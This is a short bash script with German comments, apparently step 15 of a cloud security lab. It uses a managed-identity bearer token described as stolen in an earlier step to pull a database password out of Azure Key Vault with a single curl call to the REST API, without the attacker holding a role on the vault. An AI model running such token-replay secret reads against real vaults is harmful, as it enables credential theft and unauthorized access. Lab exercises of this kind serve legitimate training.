#!/usr/bin/env bash
# ==============================================================================
# 15. KEY VAULT LAB: SECRET DIREKT MIT GESTOHLENEM TOKEN AUSLESEN
# ==============================================================================
# Verwendet das in Schritt 14 extrahierte Bearer-Token der Managed Identity,
# um das Datenbank-Passwort direkt über die Azure Key Vault REST API
# auszulesen – ohne dass der Angreifer selbst eine RBAC-Rolle auf dem Vault
# besitzt.
#
# Voraussetzung:
# export TOKEN="<hier_access_token_aus_schritt_14_einfuegen>"
#
# Erklärung der Parameter:
# -H "Authorization: Bearer $TOKEN" : Übergibt das gestohlene Entra-ID-Token
# api-version=7.4                   : Azure Key Vault Secret REST API Version

curl -H "Authorization: Bearer ${TOKEN}" \
  "https://${KV}.vault.azure.net/secrets/${DB_SECRET_NAME}?api-version=7.4"
